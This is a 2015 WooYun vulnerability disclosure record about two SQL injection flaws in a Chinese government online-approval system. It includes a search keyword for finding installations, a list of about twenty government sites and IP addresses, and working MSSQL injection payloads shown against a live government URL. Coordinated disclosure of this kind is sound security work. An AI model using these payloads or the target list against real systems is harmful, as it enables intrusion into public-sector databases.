{"id": 29435, "wybug_id": "wooyun-2015-0119376", "wybug_title": "某政务系统两处通用SQL注入漏洞（附众多政务案例）", "wybug_corp": "邯郸市连邦软件发展有限公司", "wybug_author": "路人甲", "wybug_date": "2015-06-10 11:57", "wybug_open_date": "2015-09-13 10:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向公众公开  简要描述： 某政务系统两处通用SQL注入漏洞（附众多政务案例） 详细说明：  系统开发厂商：邯郸市连邦软件发展有限公司系统架构：ASPX+MSSQL漏洞文件：workplate/xzsp/gxxt/tjfx/dtl.aspx两处注入xksx参数过滤存在问题，导致注入sxmc参数过滤存在问题，导致注入关键字：inurl：workplate部分政府案例：日照市网上审批系统http://www.rzfwzx.gov.cn/workplate/保定市网上审批系统http://www.bdxzfw.cn/workplate/磁县网上审批系统http://www.cxxzfwzx.com/workplate/魏县网上审批系统http://wxxz.gov.cn/workplate/邯郸县网上审批系统http://www.hdxzwzx.com/workplate/南郊区网上审批系统http://xz.njqsp.com:8001/workplate/城区网上审批系统http://211.142.37.152:81/workplate/左云县网上审批系统 http://211.142.37.152:88/workplate/天镇县网上审批系统http://211.142.37.154:83/workplate/广灵县网上审批系统 http://211.142.37.152:83/workplate/新荣区网上审批系统http://183.203.128.238:82/workplate/矿区网上审批系统http://211.142.41.114:82/workplate/涉县网上审批系统http://www.hbsxxzfwzx.gov.cn/workplate/临漳县网上审批系统http://www.lzxzfwzx.com/workplate/安新县网上审批系统http://www.axxzfwzx.com/workplate/高阳县网上审批系统http://gyxzfw.net/workplate/长子县网上审批系统http://60.220.253.153:81/workplate/屯留县网上审批系统http://60.220.240.7/workplate/浑源县网上审批系统http://211.142.37.152:85/workplate/邱县网上审批系统www.qxxzfwzx.com/workplate/南郊区网上审批系统http://xz.njqsp.com:8001/workplate/大同县网上审批系统http://211.142.37.152:82/workplate/等等   漏洞证明：  漏洞验证：日照行政审批系统：http://www.rzfwzx.gov.cn/workplate/xzsp/gxxt/tjfx/dtl.aspx?id=76001&refnum=137&baseorg=209&flag=%27%27&xksx=928&sxmc=%E5%B2%B1%E6%91%A9%E6%96%AF%E6%B1%BD%E8%BD%A6%E4%BC%A0%E5%8A%A8%E7%B3%BB%E7%BB%9F%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%7c%E9%82%80%E8%AF%B7%E5%A4%96%E5%9B%BD%E4%BA%BA%E6%9D%A5%E8%AE%BF为例\n\n\nPlace: GETParameter: xksx    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=76001&refnum=137&baseorg=209&flag=''&xksx=928 AND 5044=CONVERT(INT,(CHAR(58) CHAR(98) CHAR(104) CHAR(110) CHAR(58) (SELECT (CASE WHEN (5044=5044) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(117) CHAR(104) CHAR(120) CHAR(58)))&sxmc=%E5%B2%B1%E6%91%A9%E6%96%AF%E6%B1%BD%E8%BD%A6%E4%BC%A0%E5%8A%A8%E7%B3%BB%E7%BB%9F%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8|%E9%82%80%E8%AF%B7%E5%A4%96%E5%9B%BD%E4%BA%BA%E6%9D%A5%E8%AE%BF    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: id=76001&refnum=137&baseorg=209&flag=''&xksx=928 AND 1225=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)&sxmc=%E5%B2%B1%E6%91%A9%E6%96%AF%E6%B1%BD%E8%BD%A6%E4%BC%A0%E5%8A%A8%E7%B3%BB%E7%BB%9F%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8|%E9%82%80%E8%AF%B7%E5%A4%96%E5%9B%BD%E4%BA%BA%E6%9D%A5%E8%AE%BF---\n\n\n注入二：\nPlace: GETParameter: sxmc    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=76001&refnum=137&baseorg=209&flag=''&xksx=928&sxmc=%E5%B2%B1%E6%91%A9%E6%96%AF%E6%B1%BD%E8%BD%A6%E4%BC%A0%E5%8A%A8%E7%B3%BB%E7%BB%9F%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8|%E9%82%80%E8%AF%B7%E5%A4%96%E5%9B%BD%E4%BA%BA%E6%9D%A5%E8%AE%BF) AND 1052=1052 AND (9552=9552---\n\n\n\n\n   修复方案：  如上、   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-06-15 10:48 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给河北分中心，由其后续协调网站管理单位及厂商处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}